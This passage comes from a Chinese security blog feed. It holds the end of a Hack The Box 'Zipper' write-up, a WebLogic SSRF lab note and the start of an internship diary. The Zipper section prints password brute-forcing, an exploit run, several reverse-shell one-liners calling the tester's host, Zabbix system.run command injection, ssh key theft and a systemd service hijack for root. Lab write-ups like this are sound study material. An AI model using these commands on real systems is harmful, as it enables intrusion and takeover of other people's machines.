class="hljs-regexp">/top-usernames-shortlist.txt -P /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/3000-pass.txt -f 10.10.10.108 http-post-form &quot;/</span>zabbix/index.php:name=^USER^&amp;password=^PASS^&amp;autologin=<span class="hljs-number">1</span>&amp;enter=Sign+<span class="hljs-keyword">in</span>:incorrect<span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure><hr><p>msf 尝试exploit/unix/misc/zabbix_agent_exec<br>ip/端口10050,失败</p><hr><p>Zabbix Agent - ‘net.tcp.listen’ Command Injection (Metasploit)<br>Zabbix Server 2.4.X</p><hr><p><a href="http://cvedetails.com/cve/cve-2016-10134">CVE-2016-10134</a><br> before 3.0.4 allows remote attackers to execute arbitrary SQL commands<br>auxiliary/gather/zabbix_toggleids_sqli<br>失败</p><hr><p>发现一个登陆表单，searchsploit zabbix，常规操作</p><h3 id="10050-port"><a href="#10050-port" class="headerlink" title="10050 port"></a>10050 port</h3><p><a href="http://10.10.10.108:10050/">http://10.10.10.108:10050</a><br>searchsploit zabbix<br>Zabbix Agent - ‘net.tcp.listen’ Command Injection (Metasploit) </p><p>use exploit/linux/misc/zabbix_server_exec<br>use exploit/unix/misc/zabbix_agent_exec</p><hr><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>log in as guest，在主页面发现了一个用户名Zipper，仔细查找网页内容，把zapper、Zipper、zipper添加到字典中进行爆破<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-02-11/14.PNG" alt="14"></p><h2 id="拿到服务器参数"><a href="#拿到服务器参数" class="headerlink" title="拿到服务器参数"></a>拿到服务器参数</h2><p>通过官网获得api使用方法：<a href="https://www.zabbix.com/documentation/3.0/manual/api">https://www.zabbix.com/documentation/3.0/manual/api</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-02-11/3.PNG" alt="3"></p><figure class="highlight scala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scala">curl -i -<span class="hljs-type">X</span> <span class="hljs-type">POST</span> -<span class="hljs-type">H</span> <span class="hljs-symbol">&#x27;Content</span>-<span class="hljs-class"><span class="hljs-keyword">type</span></span>:application/json&#x27; -d &#x27;&#123;<span class="hljs-string">&quot;jsonrpc&quot;</span>:<span class="hljs-string">&quot;2.0&quot;</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;user.login&quot;</span>,<span class="hljs-string">&quot;params&quot;</span>:&#123; <span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;zapper&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;zapper&quot;</span>&#125;,<span class="hljs-string">&quot;auth&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">0</span>&#125;&#x27; http:<span class="hljs-comment">//10.10.10.108/zabbix/api_jsonrpc.php</span><br>---<br>curl -i -<span class="hljs-type">X</span> <span class="hljs-type">POST</span> -<span class="hljs-type">H</span> <span class="hljs-symbol">&#x27;Content</span>-<span class="hljs-class"><span class="hljs-keyword">type</span></span>:application/json&#x27; -d &#x27;&#123;<span class="hljs-string">&quot;jsonrpc&quot;</span>:<span class="hljs-string">&quot;2.0&quot;</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;host.get&quot;</span>,<span class="hljs-string">&quot;params&quot;</span>:&#123; <span class="hljs-string">&quot;output&quot;</span>: [<span class="hljs-string">&quot;hostid&quot;</span>,<span class="hljs-string">&quot;host&quot;</span>],<span class="hljs-string">&quot;selectInterfaces&quot;</span>:[<span class="hljs-string">&quot;interfaceid&quot;</span>,<span class="hljs-string">&quot;ip&quot;</span>] &#125;,<span class="hljs-string">&quot;auth&quot;</span>:<span class="hljs-string">&quot;注意修改这里的hash是通过上一条命令得到的&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">0</span>&#125;&#x27; http:<span class="hljs-comment">//10.10.10.108/zabbix/api_jsonrpc.php</span><br></code></pre></div></td></tr></table></figure><h2 id="修改exp并执行"><a href="#修改exp并执行" class="headerlink" title="修改exp并执行"></a>修改exp并执行</h2><p>通过api，查询到服务器参数，然后修改exp</p><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">searchsploit -m exploits/hp/webapps/<span class="hljs-number">39937.</span>py<br><br>ZABIX_ROOT = <span class="hljs-string">&#x27;http://10.10.10.108/zabbix&#x27;</span>### Zabbix IP-address<br>login = <span class="hljs-string">&#x27;zapper&#x27;</span>### Zabbix login<br>password = <span class="hljs-string">&#x27;zapper&#x27;</span>### Zabbix password<br>hostid = <span class="hljs-string">&#x27;10105&#x27;</span>### Zabbix hostid<br><br>python <span class="hljs-number">39937.</span>py 即可拿到webshell<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-02-11/1.PNG" alt="1"></p><h2 id="反弹docker虚拟机的shell到本地"><a href="#反弹docker虚拟机的shell到本地" class="headerlink" title="反弹docker虚拟机的shell到本地"></a>反弹docker虚拟机的shell到本地</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">参考pentestmonkey的reverse</span> <span class="hljs-string">shell</span><br><span class="hljs-string">反弹shell到本地。</span><br><br><span class="hljs-string">nc</span> <span class="hljs-string">-lnvp</span> <span class="hljs-number">1234</span><br><span class="hljs-string">首先本地监听1234端口</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">webshell执行以下命令</span><br><span class="hljs-string">方法一：perl</span> <span class="hljs-string">-e</span> <span class="hljs-string">&#x27;use Socket;$i=&quot;10.10.14.10&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><br><span class="hljs-string">方法二：rm</span> <span class="hljs-string">/tmp/f;mkfifo</span> <span class="hljs-string">/tmp/f;cat</span> <span class="hljs-string">/tmp/f|/bin/sh</span> <span class="hljs-string">-i</span> <span class="hljs-number">2</span><span class="hljs-string">&gt;&amp;1|nc</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.10</span> <span class="hljs-number">1234</span> <span class="hljs-string">&gt;/tmp/f</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">python</span> <span class="hljs-string">-c</span> <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-string">反弹standard</span> <span class="hljs-string">shell失败，没有找到python</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">SHELL=/bin/bash</span> <span class="hljs-string">script</span> <span class="hljs-string">-q</span> <span class="hljs-string">/dev/null</span><br><span class="hljs-string">获得startard</span> <span class="hljs-string">tty</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">find</span> <span class="hljs-string">/</span> <span class="hljs-string">-name</span> <span class="hljs-string">&quot;*.txt&quot;</span> <span class="hljs-number">2</span><span class="hljs-string">&gt;/dev/null</span><br><span class="hljs-string">本意是查找user.txt</span><br><br><span class="hljs-string">结果显示了一个web的路径。</span><br><span class="hljs-string">/usr/share/zabbix/robots.txt</span><br><br><span class="hljs-string">cat</span> <span class="hljs-string">/usr/share/zabbix/conf/zabbix.conf.php</span><br><br><span class="hljs-string">$DB[&#x27;TYPE&#x27;]</span>     <span class="hljs-string">=</span> <span class="hljs-string">&#x27;MYSQL&#x27;</span><span class="hljs-string">;</span><br><span class="hljs-string">$DB[&#x27;SERVER&#x27;]</span>   <span class="hljs-string">=</span> <span class="hljs-string">&#x27;localhost&#x27;</span><span class="hljs-string">;</span><br><span class="hljs-string">$DB[&#x27;PORT&#x27;]</span>     <span class="hljs-string">=</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-string">;</span><br><span class="hljs-string">$DB[&#x27;DATABASE&#x27;]</span> <span class="hljs-string">=</span> <span class="hljs-string">&#x27;zabbixdb&#x27;</span><span class="hljs-string">;</span><br><span class="hljs-string">$DB[&#x27;USER&#x27;]</span>     <span class="hljs-string">=</span> <span class="hljs-string">&#x27;zabbix&#x27;</span><span class="hljs-string">;</span><br><span class="hljs-string">$DB[&#x27;PASSWORD&#x27;]</span> <span class="hljs-string">=</span> <span class="hljs-string">&#x27;f.YMeMd$pTbpY3-449&#x27;</span><span class="hljs-string">;</span><br><br><span class="hljs-string">mysql</span> <span class="hljs-string">-u</span> <span class="hljs-string">zabbix</span> <span class="hljs-string">-p</span> <br><span class="hljs-string">f.YMeMd$pTbpY3-449</span>     <span class="hljs-comment">#输入密码</span><br><span class="hljs-string">页面提示</span><br><span class="hljs-string">ERROR</span> <span class="hljs-number">1044</span> <span class="hljs-string">(42000):</span> <span class="hljs-string">Access</span> <span class="hljs-string">denied</span> <span class="hljs-string">for</span> <span class="hljs-string">user</span> <span class="hljs-string">&#x27;zabbix&#x27;</span><span class="hljs-string">@&#x27;localhost&#x27;</span> <span class="hljs-string">to</span> <span class="hljs-string">database</span> <span class="hljs-string">&#x27;f.YMeMd-449mysql&#x27;</span><br><span class="hljs-string">连接失败</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">ls</span> <span class="hljs-string">-al</span> <span class="hljs-string">/</span><br><span class="hljs-string">-rwxr-xr-x</span>   <span class="hljs-number">1</span> <span class="hljs-string">root</span> <span class="hljs-string">root</span>    <span class="hljs-number">0</span> <span class="hljs-string">Sep</span> <span class="hljs-number">30</span> <span class="hljs-number">21</span><span class="hljs-string">:33</span> <span class="hljs-string">.dockerenv</span><br><span class="hljs-string">发现一个docker目录，说明可能是虚拟机容器</span><br></code></pre></div></td></tr></table></figure><h2 id="反弹10-10-10-108的shell到本机"><a href="#反弹10-10-10-108的shell到本机" class="headerlink" title="反弹10.10.10.108的shell到本机"></a>反弹10.10.10.108的shell到本机</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">netstat -nr<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface<br>0.0.0.0         172.17.0.1      0.0.0.0         UG        0 0          0 eth0<br>172.17.0.0      0.0.0.0         255.255.0.0     U         0 0          0 eth0<br><span class="hljs-section">查看路由表</span><br><span class="hljs-section">---</span><br><span class="hljs-section">ifconfig，本地ip为172.17.0.2</span><br><span class="hljs-section">---</span><br>nc -nv 172.17.0.1 10050<br><span class="hljs-section">用nc扫描网关的的10050端口，为open状态</span><br><span class="hljs-section">---</span><br>echo system.run[ ifconfig ] | nc 172.17.0.1 10050<br>通过zabbix server system.run的系统特性，可以进行命令执行<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-02-11/2.PNG" alt="2"></p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">echo</span> <span class="hljs-string">system.run[</span> <span class="hljs-string">nc</span> <span class="hljs-string">-e</span> <span class="hljs-string">/bin/bash</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.10</span> <span class="hljs-number">1235</span> <span class="hljs-string">]</span> <span class="hljs-string">|</span> <span class="hljs-string">nc</span> <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">10050</span><br><span class="hljs-string">提示nc没有-e参数</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">echo</span> <span class="hljs-string">system.run[</span> <span class="hljs-string">perl</span> <span class="hljs-string">-e</span> <span class="hljs-string">&#x27;use Socket;$i=&quot;10.10.14.10&quot;;$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span> <span class="hljs-string">]</span> <span class="hljs-string">|</span> <span class="hljs-string">nc</span> <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">10050</span><br><span class="hljs-string">提示ZBXD)ZBX_NOTSUPPORTEDInvalid</span> <span class="hljs-string">item</span> <span class="hljs-string">key</span> <span class="hljs-string">format.</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">echo</span> <span class="hljs-string">system.run[</span> <span class="hljs-string">whereis</span> <span class="hljs-string">python</span> <span class="hljs-string">]</span> <span class="hljs-string">|</span> <span class="hljs-string">nc</span> <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">10050</span><br><span class="hljs-string">echo</span> <span class="hljs-string">system.run[</span> <span class="hljs-string">/usr/bin/python3.6</span> <span class="hljs-string">-c</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.10&quot;,1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> <span class="hljs-string">]</span> <span class="hljs-string">|</span> <span class="hljs-string">nc</span> <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">10050</span><br><br><span class="hljs-string">ZBXD)ZBX_NOTSUPPORTEDInvalid</span> <span class="hljs-string">item</span> <span class="hljs-string">key</span> <span class="hljs-string">format.</span><br><span class="hljs-string">连接失败</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">echo</span> <span class="hljs-string">system.run[</span> <span class="hljs-string">nc</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.10</span> <span class="hljs-number">1235</span> <span class="hljs-string">]</span> <span class="hljs-string">|</span> <span class="hljs-string">nc</span> <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">10050</span><br><span class="hljs-string">成功连接</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">echo</span> <span class="hljs-string">system.run[</span> <span class="hljs-string">/bin/sh</span> <span class="hljs-string">-i</span> <span class="hljs-string">&gt;&amp;</span> <span class="hljs-string">/dev/tcp/10.10.14.10/1235</span> <span class="hljs-number">0</span><span class="hljs-string">&gt;&amp;1</span> <span class="hljs-string">]</span> <span class="hljs-string">|</span> <span class="hljs-string">nc</span> <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">10050</span><br><br><span class="hljs-string">echo</span> <span class="hljs-string">system.run[</span> <span class="hljs-string">rm</span> <span class="hljs-string">/tmp/f;mkfifo</span> <span class="hljs-string">/tmp/f;cat</span> <span class="hljs-string">/tmp/f|/bin/sh</span> <span class="hljs-string">-i</span> <span class="hljs-number">2</span><span class="hljs-string">&gt;&amp;1|nc</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.10</span> <span class="hljs-number">1235</span> <span class="hljs-string">&gt;/tmp/f</span> <span class="hljs-string">]</span> <span class="hljs-string">|</span> <span class="hljs-string">nc</span> <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">10050</span><br><span class="hljs-string">成功反弹172.10.0.1的/bin/sh到本地</span><br><span class="hljs-string">连上了是连上了，但总是会掉线</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">本机监听nc</span> <span class="hljs-string">-lnvp</span> <span class="hljs-number">1234</span><br><span class="hljs-string">echo</span> <span class="hljs-string">&quot;system.run[(/bin/bash -c &#x27;bash -i &gt;/dev/tcp/10.10.14.10/1234 0&lt;&amp;1 2&gt;&amp;1 &amp;&#x27;)]&quot;</span> <span class="hljs-string">|</span> <span class="hljs-string">nc</span> <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">10050</span><br><span class="hljs-string">连上了</span><br></code></pre></div></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>cd /home/zapper/utils</p><p>通过backup.sh得到zapper用户密码。切换用户。</p><p>cat /home/zapper/.ssh/id_rsa</p><p>获得ssh密钥。通过ssh -i id_rsa 用户名@IP</p><p>登陆后， /home/zapper/utils/zabbix-service具有suid权限</p><p>之前文章讨论过很多suid的东西了，这里就不多说了。</p><p>在/tmp目录添加shell，命令如下</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;#!/bin/bash &#x27;</span> &gt; /tmp/<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;bash -i &gt;/dev/tcp/10.10.14.10/443 0&lt;&amp;1&#x27;</span> &gt;&gt; /tmp/<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span><br>chmod <span class="hljs-keyword">a</span>+<span class="hljs-keyword">x</span> /tmp/<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span><br></code></pre></div></td></tr></table></figure><p>在zapper配置中修改重启后运行的脚本，如果以下命令报错，可以手动修改该行。目的是重启程序，同时执行/tmp/shell.sh</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sed -i <span class="hljs-string">&#x27;s/ExecStart=\/root\/scripts\/purge-backups.sh/ExecStart=\/tmp\/shell.sh/&#x27;</span> <span class="hljs-regexp">/etc/</span>systemd<span class="hljs-regexp">/system/</span>purge-backups.service<br><br>cd <span class="hljs-regexp">/home/</span>zapper<span class="hljs-regexp">/utils;./</span>zabbix-service<br>stop<br><br>nc -lnvp <span class="hljs-number">443</span>开启监听<br><br>再次运行，start开启该服务，即可得到root权限<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-02-11/4.PNG" alt="4"></p><h2 id="存在的漏洞"><a href="#存在的漏洞" class="headerlink" title="存在的漏洞"></a>存在的漏洞</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">guest匿名登陆+信息泄露<br>弱密码<br>web api可访问，用来爆破登陆口令<br>zabbix-agentweb版本漏洞-远程代码执行<br>zabbix-<span class="hljs-keyword">server</span> <span class="hljs-keyword">system</span>.run远程代码执行<br>suid提权<br></code></pre></div></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><p>当遇到openbsd需要反弹shell的时候，nc -e没有这个参数。<br>可以用命令<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code></p></li><li><p> 拿到webshell后。cd到用户家目录，查找.ssh目录，查找id_rsa文件。拿到该文件可以通过ssh获得稳定的shell,避免掉线后重连的麻烦</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>weblogic ssrf</title>
    <link href="/2019/09/29/04-x/"/>
    <url>/2019/09/29/04-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p><h2 id="docker空间管理"><a href="#docker空间管理" class="headerlink" title="docker空间管理"></a>docker空间管理</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">du -h <span class="hljs-comment">--max-depth=1 寻找当前目录，哪个文件夹占用空间最大</span><br>docker <span class="hljs-keyword">system</span> prune -<span class="hljs-keyword">a</span>  删除镜像<br>docker <span class="hljs-keyword">system</span> df    查看磁盘使用情况<br>docker-compose down -v 删除正在用的实例<br></code></pre></div></td></tr></table></figure><h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">cd</span> <span class="hljs-string">/usr/share/vulhub-master/weblogic/ssrf</span><br><span class="hljs-string">docker-compose</span> <span class="hljs-string">build</span><br><span class="hljs-string">docker-compose</span> <span class="hljs-string">up</span> <span class="hljs-string">-d</span><br><span class="hljs-string">pkill</span> <span class="hljs-string">rinetd</span>  <span class="hljs-comment">##关闭进程</span><br><span class="hljs-string">rinetd</span> <span class="hljs-string">-c</span> <span class="hljs-string">/etc/rinetd.conf</span>  <span class="hljs-comment">##启动转发</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">docker-compose</span> <span class="hljs-string">down</span> <span class="hljs-string">-v</span><br></code></pre></div></td></tr></table></figure><p>ssrf是服务端请求伪造，意思是服务器接受我们的请求后，然后向内网发起扫描等有害操作。该漏洞出现的原因是服务器需要向内网其他机器获取资源，在请求的过程中，参数可被攻击方修改。</p><p>下图是weblogic典型的界面。下面我们看看怎么利用它。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-29-04/1.PNG" alt="1"></p><p>访问以下地址：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">18.189</span>.<span class="hljs-number">18.237</span>:<span class="hljs-number">7001</span><span class="hljs-regexp">/uddiexplorer/</span>SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7001</span><br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">18.189</span>.<span class="hljs-number">18.237</span>:<span class="hljs-number">7001</span><span class="hljs-regexp">/uddiexplorer/</span>SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7002</span><br></code></pre></div></td></tr></table></figure><p>用burp intruder可以看到7001页面显示的长度，和其他端口不同，说明7001端口开放。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-29-04/5.PNG" alt="5"></p><p>如果内网有其他web漏洞可以反弹shell，例如redis…也可以通过上面的<code>operator=http://127.0.0.1:7002</code>参数反弹shell</p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>过滤参数，禁止参数访问内网IP，例如上文所说的operator参数。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第三次实习</title>
    <link href="/2019/09/21/10-x/"/>
    <url>/2019/09/21/10-x/</url>
    
    <content type="html"><![CDATA[<p>不知不觉暑假已经过去了，而我混入安全圈的目标，也悄悄达成了。估计毕业以后应该能做渗透测试吧。</p><p>安全服务大致分为三部分的工作内容，应急响应+渗透测试+安全培训</p><p>应急响应，就是客户被黑了然后去客户现场恢复系统等等；<br>渗透测试，就是找找客户系统漏洞，然后写一份报告；<br>安全培训，就是给客户做安全意识、安全技能等方面的培训。</p><hr><h2 id="19年9月20日晨"><a href="#19年9月20日晨" class="headerlink" title="19年9月20日晨"></a>19年9月20日晨</h2><p>今早呆立半响，写下这段文字。</p><p>我内推无果，觉得转正无望，但是仍然没有任何人来通知我这个事。我问了技术负责人，他也只是说下次找我谈这个事，但等了很久仍然没有找我谈。于是我找HR，跨越大半个城区，赶往电子科大学生中心。坐了两趟地铁、一趟公交，等待许久，终于轮到了我面试。我是最后一个面试的。</p><p>结果也是预料之中。但是过程令我惊讶的是，面试过程老总没有问我一个技术问题。他坦言我技术不如另一个实习生，我应该趁着秋招找找其他公司。我从其他同事口中多次谈到老总的名字，如他所言，确实是一个惯会做人的人。即使拒绝了我的转正，也是说的十分委婉动听，但是你要是信了他的话，那可就完了。他们这种人，说任何话都保有一丝余地，但并不是真的。</p><p>回顾实习的三个月，我做过渗透测试和安全培训。可是我从内心抵触做安全培训，因为我认为这种政策驱动的、给国企培训CTF并没有意义。但是我的渗透测试能力也不是多么卓然出群，而且代码审计也不如另外一个实习生。我转不了正。</p><p>可是理想主义者也要混口饭吃。</p><p>不是没有想过放弃。但是坚持比放弃难多了，坚持也比放弃更有意义。虽然活着没有意义，但是活着就是为了给生命赋予意义。虽然经常痛苦着，但有时也快乐。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-23/1.jpg" alt="12"></p><p>我早在2017年就嗅到了经济危机的味道，因此早早的为就业做准备。没想到，缩招的趋势还是狠狠给了我一个打击，结果仍然不乐观。</p><p>我看到了2019年生育率进一步下降，而卫计委说“中国不缺人口，在未来一百年都不缺”。如果老龄化严重到2个人中就有1个超过60岁的老年人，那么钱再多又有什么用呢。劳动力不足，届时物价、工资飞涨，老年人存下来的积蓄很快就会用完。</p><hr><p>晚上跟某安全从业者交流，他认为“挖掘0day才有前途，安全测试都是体力活”，但是挖掘0day需要很多基础，不是能够速成的东西，也没有什么定式可言。对于应届生来说，要求0day挖掘能力也不现实，只能在工作中，慢慢积累经验。</p><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs 